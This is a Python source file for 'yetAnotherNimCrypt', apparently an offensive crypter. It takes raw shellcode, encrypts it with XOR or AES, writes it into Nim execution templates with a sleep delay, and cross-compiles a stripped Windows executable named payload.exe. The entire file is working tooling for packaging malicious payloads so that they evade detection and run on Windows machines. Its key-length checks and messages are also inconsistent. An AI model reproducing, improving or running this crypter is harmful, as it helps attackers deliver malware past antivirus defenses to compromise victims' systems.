#!/usr/bin/env python3
"""
yetAnotherNimCrypt by xl00t

Usage:
  yetAnotherNimCrypt.py <shellcode_path> [--key=<key>] [--encryption=<encryption>] [--output=<output>] [--technique=<technique>] [--sleep_time=<sleep_time>]


Options:
  -h --help     Show this screen.
  -V --version     Show version.
"""

from docopt import docopt
import os
import random
import shutil
import subprocess
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

BLOCK_SIZE = 16

CWD = os.path.join(os.path.dirname(__file__))

def random_key(length=32):
    return random.randbytes(length)

def convert_shellcode(raw_shellcode):
    formated_shellcode = f"var buf: array[{len(raw_shellcode)}, byte] = ["
    for i in range(0, len(raw_shellcode)):
        formated_shellcode += f"{raw_shellcode[i]},"

    # Delete last ','
    formated_shellcode = formated_shellcode[:-1]
    formated_shellcode += ']\n'
    print("[+] Formated shellcode")
    return formated_shellcode


def convert_key(key):
    formated_key = f"var key: array[{len(key)}, byte] = ["
    for i in range(0, len(key)):
        formated_key += f"{key[i]},"
    formated_key = formated_key[:-1]
    formated_key += ']'
    print("[+] Formated key")
    return formated_key

def xor_shellcode(shellcode, key):
    key_padd = key * (len(shellcode)//len(key)+1)
    cipher = b""
    for i in range(len(shellcode)):
        cipher += bytes([shellcode[i] ^ key_padd[i]])

    return cipher
    
def aes_shellcode(shellcode, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(shellcode, BLOCK_SIZE))

def write_encrypt_template(encrypt, key):
    try:
        formated_key = convert_key(key)
        shutil.copyfile(f"{CWD}/ciphers/{encrypt}.nim", f"{CWD}/build/crypt.nim")
        encrypt_template_updated =  open(f"{CWD}/build/crypt.nim", 'r').read().replace('KEY_PLACEHOLDER', formated_key)
        
        open(f"{CWD}/build/crypt.nim", 'w').write(encrypt_template_updated)
        print(f"[+] Encrypt template updated using encryption: {encrypt}")
    except Exception as e:
        import traceback
        print(traceback.format_exc())
        print("[-] Invalid Encryption", e)
        sys.exit(1)


def write_shellcode_template(technique, shellcode, sleep_time):
    try:

        formated_shellcode = convert_shellcode(shellcode)

        shutil.copyfile(f"{CWD}/techniques/{technique}.nim", f"{CWD}/build/exec.nim")

        shellcode_template_updated =  open(f"{CWD}/build/exec.nim", 'r').read().replace('SHELLCODE_PLACEHOLDER', formated_shellcode).replace("SLEEP_PLACEHOLDER", sleep_time)
        
        open(f"{CWD}/build/exec.nim", 'w').write(shellcode_template_updated)
        print(f"[+] Shellcode template updated using technique: {technique}")
    except Exception as e:
        import traceback
        print(traceback.format_exc())
        print("[-] Invalid Technique", e)
        sys.exit(1)

def compile_shellcode_loader(output_path):
    subprocess.run(["nim", "c", "--app:console", "--cpu:amd64", "--os:windows", "--gcc.exe:x86_64-w64-mingw32-gcc", "--gcc.linkerexe:x86_64-w64-mingw32-gcc", "-d:release", "-d:strip", "--opt:size", f"-o:{output_path}", f"{CWD}/build/exec.nim"], stdout=subprocess.DEVNULL)
    print("[+] Shellcode loader compiled")

if __name__ == '__main__':
    arguments = docopt(__doc__, version='yetAnotherNimCrypt 0.1')
    
    key = random_key(32) if not arguments["--key"] else arguments["--key"].encode()
    encryption = "xor" if not arguments["--encryption"] else arguments["--encryption"].lower()
    technique = "EnumCalendarInfo" if not arguments["--technique"] else arguments["--technique"]
    sleep_time = str(5) if not arguments["--sleep_time"] else arguments["--sleep_time"]
    output_path = "./payload.exe" if not arguments["--output"]  else arguments["--output"]
    shellcode_enc = None

    shellcode = open(arguments["<shellcode_path>"], 'rb').read()

    print(f"[+] Using sleep of {sleep_time} seconds")

    if len(key) < len(shellcode) and encryption == "xor":
        print("[-] When using xor, the key must be at least as long as quarter of the shellcode length")
        print(f"[+] Generating random key of {len(shellcode)//4} bytes")
        key = random_key(len(shellcode) // 4)

    if len(key) != BLOCK_SIZE and encryption == "aes":
        print("[-] When using aes, the key must be 32 bytes")
        print(f"[+] Generating random key of 32 bytes")
        key = random_key(32)

    if key:
        if len(key) <= 32:
            print(f"[+] Using {encryption} key: {key.hex()}")
        else:
            print(f"[+] Using {encryption} key: {str(key.hex())[:32]}...")

        if encryption == "xor":
            shellcode_enc = xor_shellcode(shellcode, key)
            write_encrypt_template(encryption, key)

        elif encryption == "aes":
            shellcode_enc = aes_shellcode(shellcode, key)
            write_encrypt_template(encryption, key)
        

    write_shellcode_template(technique, shellcode_enc, sleep_time)
    compile_shellcode_loader(output_path)
